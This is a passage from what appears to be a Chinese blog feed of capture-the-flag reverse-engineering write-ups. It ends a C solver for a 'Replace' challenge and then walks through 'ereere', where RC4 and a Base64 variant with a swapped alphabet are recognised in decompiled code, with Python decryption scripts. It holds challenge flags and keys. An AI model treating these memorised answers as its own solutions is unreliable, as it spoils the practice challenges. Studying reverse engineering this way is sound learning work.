number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span>            <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>            <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span>            <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>            <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span>            <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span>            <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span>            <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>            <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span>            <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span>            <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>            <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span>            <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span>            <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span>            <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    string byte_402150 <span class="token operator">=</span> <span class="token string">"2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6"</span><span class="token punctuation">;</span>    string byte_402151 <span class="token operator">=</span> <span class="token string">"a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> v5<span class="token punctuation">;</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span>    <span class="token keyword">int</span> v7<span class="token punctuation">;</span>    <span class="token keyword">char</span> v8<span class="token punctuation">;</span>    <span class="token keyword">int</span> v9<span class="token punctuation">;</span>    <span class="token keyword">char</span> v10<span class="token punctuation">;</span>    <span class="token keyword">int</span> v11<span class="token punctuation">;</span>    <span class="token keyword">int</span> v12<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v8 <span class="token operator">=</span> byte_402150<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">&lt;</span> <span class="token number">48</span> <span class="token operator">||</span> v8 <span class="token operator">></span> <span class="token number">57</span> <span class="token punctuation">)</span>            v9 <span class="token operator">=</span> v8 <span class="token operator">-</span> <span class="token number">87</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            v9 <span class="token operator">=</span> v8 <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        v11 <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">*</span> v9<span class="token punctuation">;</span>        v10 <span class="token operator">=</span> byte_402151<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v10 <span class="token operator">&lt;</span> <span class="token number">48</span> <span class="token operator">||</span> v10 <span class="token operator">></span> <span class="token number">57</span> <span class="token punctuation">)</span>            v12 <span class="token operator">=</span> v10 <span class="token operator">-</span> <span class="token number">87</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            v12 <span class="token operator">=</span> v10 <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">127</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            v6 <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>            v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>byte_4021A0<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> v6 <span class="token operator">+</span> v7<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">+</span> v12<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                v5 <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        v4<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token number">35</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Replace5.png" alt="攻防世界-Replace5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】ereere</title>
      <link href="/posts/d5707ca8.html"/>
      <url>/posts/d5707ca8.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉<mark>伪代码中的 Base64 和 RC4</mark>，以及快速编写脚本</p></li><li><p><mark>识别伪代码中的 <code>strlen()</code> 函数</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=f51941ee-3b28-11ed-9802-fa163e4fa66d&task_category_id=4">【攻防世界】ereere</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>根据 Strings 页面定位到主函数 <code>sub_400BC8()</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere1.png" alt="攻防世界-ereere1.png"></p><p>得到主函数内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere2.png" alt="攻防世界-ereere2.png"></p><p>v3 是用户的输入，大概率就是 flag，v3 首先经过了函数 <code>sub_41A6E0(v3)</code> 的处理，跟进</p><p>得到 <code>sub_41A6E0()</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere3.png" alt="攻防世界-ereere3.png"></p><p>结合中间一个循环的特点：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>LABEL_7<span class="token operator">:</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">-</span> <span class="token number">16843009</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">&amp;</span> <span class="token number">0x80808080</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>a1 <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      a1 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数的作用应该是计算字符串的长度，即 <code>strlen()</code></p><p>然后函数 <code>sub_4009DC()</code> 对 v3 进行了处理，继续跟进：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere4.png" alt="攻防世界-ereere4.png"></p><p>在函数最开始，首先调用了 <code>sub_400864()</code>，跟进：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere5.png" alt="攻防世界-ereere5.png"></p><p>可以看到两个 256 的 for 循环（<mark>十六进制的 0x100 就是十进制的 256</mark>）<br>并且第一个 for 循环仅赋值，第二个 for 循环有 swap 操作<br>再结合 <code>sub_4009DC()</code> 后面部分的一个 for 循环、余 256、一个 swap 操作和一个异或操作</p><p>可以明显得知这是 RC4 算法的特征<br><code>sub_400864()</code> 做 s 盒的初始化操作，即 rc4_init<br><code>sub_4009DC()</code> 做加解密操作，即 rc4_crypt</p><p>根据 RC4 算法的特点，可知 <code>byte_4A0860[]</code> 为 <code>s_box</code>，<code>aFlag1233213211[]</code> 为 <code>Key</code><br>同时得到 <code>aFlag1233213211[]</code> 的内容：<code>flag&#123;123321321123badbeef012&#125;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere6.png" alt="攻防世界-ereere6.png"></p><p>回到主函数 <code>sub_400BC8()</code> 中，在 RC4 算法之后，函数 <code>sub_400550()</code> 又对 <code>v3</code> 做了处理，跟进：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere7.png" alt="攻防世界-ereere7.png"></p><p>发现多次对数组 <code>aZyxwvutsrqponm[]</code> 的索引操作，且 <code>aZyxwvutsrqponm[]</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ereere8.png" alt="攻防世界-ereere8.png"></p><p><code>ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210</code>，神似 Base64 的密码表<br>再结合每次赋值的偏移操作，如：<code>*(_BYTE *)(v13 + v3)</code> 等<br>以及 if 判断语句中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">=</span> aZyxwvutsrqponm<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span>v8<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>i &lt; 2</code> 的条件下，存在两次赋值 ‘&#x3D;’ 的操作 <strong>（61 是 ‘&#x3D;’ 的 ASCii 码）</strong><br>这些都是 Base64 加密的特点，可以推知函数 <code>sub_400550()</code> 是一个更换了原始码表的 Base64 算法</p><p>也就是说，本题是将 flag 进行 RC4 加密后，再进行更换码表的 Base64 加密，最终加密结果为：<br><code>ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ==</code></p><p>先进行更换码表的 Base64 解密，再进行 RC4 解密，即可得到 flag</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="Python（引用库）"><a href="#Python（引用库）" class="headerlink" title="Python（引用库）"></a>Python（引用库）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4key <span class="token operator">=</span> <span class="token string">"ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ=="</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210"</span>  <span class="token comment"># string1表示更换后的码表</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment"># string2表示原始码表</span>Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Base64解密，bytes型</span>aFlag1233213211 <span class="token operator">=</span> <span class="token string">"flag&#123;123321321123badbeef012&#125;"</span>flag <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Python（完整实现）"><a href="#Python（完整实现）" class="headerlink" title="Python（完整实现）"></a>Python（完整实现）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64flag <span class="token operator">=</span> <span class="token string">""</span>key <span class="token operator">=</span> <span class="token 